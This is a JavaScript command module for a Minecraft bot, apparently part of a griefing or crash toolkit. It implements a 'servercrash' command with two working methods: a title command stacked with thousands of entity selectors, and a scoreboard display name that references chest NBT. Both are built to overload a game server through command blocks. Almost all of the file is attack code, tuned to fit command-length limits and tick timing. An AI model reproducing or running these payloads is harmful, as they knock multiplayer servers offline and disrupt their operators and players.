'use strict';

const { chestPosition } = require('../crash');

// A crash method is one command string. The core writes it into a command
// block, and bot.chat() refuses to run anything without a ready core, so the
// whole payload has to fit a single core command: core.run() slices at 32000
// characters, which would cut a long component into invalid JSON. The count is
// clamped to what fits instead of being sent broken.
const MAX_COMMAND_LENGTH = 32000;

// One tick of breathing room between phases: a command written into a core
// block runs on the next tick, and a phase that reads what the last one wrote
// has to wait for it.
const STEP_MS = 100;

const ENTITY_SELECTOR = '{"selector":"@e[limit=100]"}';
const TITLE_HEAD = 'title @a title {"text":"phantomSLAY","color":"#ffccee","extra":[';
const TITLE_TAIL = ']}';

const SCOREBOARD_OBJECTIVE = 'kickobj';
const SCOREBOARD_HOLDER = 'foo';
const DISPLAY_SELECTORS = 2;

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// Ported from the example's `commands/servercrash.js`: a title whose component
// carries a stack of entity selectors. Each selector is resolved server-side
// when the title is rendered, so one command asks the server for `count` of
// them at once.
function titleSelectors({ count }) {
    const parts = new Array(count).fill(ENTITY_SELECTOR);
    return `${TITLE_HEAD}${parts.join(',')}${TITLE_TAIL}`;
}

// `build` gets the already clamped count and returns the command line.
// `run` is for a method that needs more than one command and its own pacing.
const METHODS = {
    title: {
        description: 'title with stacked @e selectors (the example method)',
        defaultCount: 900,
        maxCount: 5000,
        build: titleSelectors
    },
    scoreboard: {
        description: 'sidebar display name reading the crash chest (build it with crashchest)',
        run: async ctx => {
            const numbers = ctx.args.slice(1, 4).map(value => parseInt(value, 10));
            const explicit = numbers.length === 3 && numbers.every(Number.isInteger);
            const position = explicit
                ? { x: numbers[0], y: numbers[1], z: numbers[2] }
                : ctx.bot.crashChest || chestPosition(ctx.bot);
            if (!position) {
                return ctx.reply(
                    `No chest yet: ${ctx.prefix}crashchest first, or ${ctx.prefix}servercrash scoreboard <x> <y> <z>.`
                );
            }

            const at = `${position.x} ${position.y} ${position.z}`;
            const refs = new Array(DISPLAY_SELECTORS).fill({ nbt: 'CustomName', block: at });
            const display = `scoreboard players display name ${SCOREBOARD_HOLDER} ${SCOREBOARD_OBJECTIVE} ` +
                JSON.stringify({ text: '', extra: refs });

            // remove and add cannot share a tick: block order decides which runs
            // first, and an add that lands before the remove is deleted again.
            ctx.run(`scoreboard objectives remove ${SCOREBOARD_OBJECTIVE}`);
            await sleep(STEP_MS);
            ctx.run(`scoreboard objectives add ${SCOREBOARD_OBJECTIVE} dummy`);
            await sleep(STEP_MS);
            ctx.run(`scoreboard objectives setdisplay sidebar ${SCOREBOARD_OBJECTIVE}`);
            ctx.run(`scoreboard players set ${SCOREBOARD_HOLDER} ${SCOREBOARD_OBJECTIVE} 1`);
            await sleep(STEP_MS);

            ctx.reply(`Scoreboard crash on ${at}; sending the payload.`);
            // The trigger goes last: once the name is read the packet is built.
            ctx.run(display);
            return true;
        }
    }
};

const DEFAULT_MAX_COUNT = 5000;

function fits(method, count) {
    return method.build({ count }).length <= MAX_COMMAND_LENGTH;
}

// Highest count the method can take and still fit one core command. A method
// whose payload grows with the count hits the length wall before maxCount; one
// whose payload is fixed is simply capped at maxCount.
function fitCount(method, requested) {
    const ceiling = Math.max(1, Math.floor(Number(method.maxCount) || DEFAULT_MAX_COUNT));
    let count = Math.min(Math.max(1, Math.floor(requested)), ceiling);
    if (fits(method, count)) return count;

    let low = 1;
    let high = count;
    while (low < high) {
        const mid = Math.ceil((low + high) / 2);
        if (fits(method, mid)) low = mid;
        else high = mid - 1;
    }
    return low;
}

module.exports = {
    name: 'servercrash',
    aliases: ['crash'],
    description: 'Run a server crash method (admin only)',
    usage: 'servercrash <method|list> [count]',
    level: 'admin',
    METHODS,

    async execute(ctx) {
        const names = Object.keys(METHODS);
        const label = String(ctx.args[0] || '').toLowerCase();

        if (!label || label === 'list' || label === 'methods') {
            return ctx.reply(
                `Methods: ${names.join(', ')} | usage: ${ctx.prefix}servercrash <method> [count]`
            );
        }

        const method = METHODS[label];
        if (!method) {
            return ctx.reply(`Unknown method "${label}". Methods: ${names.join(', ')}`);
        }

        if (typeof method.run === 'function') return method.run(ctx);

        const raw = ctx.args.length > 1 ? parseInt(ctx.args[1], 10) : method.defaultCount;
        const requested = Number.isFinite(raw) && raw > 0 ? raw : method.defaultCount;
        const count = fitCount(method, requested);
        const command = method.build({ count });

        if (!ctx.run(command)) {
            return ctx.reply(`Core is not ready; ${label} was not sent.`);
        }

        const clamped = count !== requested ? ` (clamped from ${requested} to fit one core command)` : '';
        return ctx.reply(`Boom: ${label} x${count}${clamped}.`);
    }
};
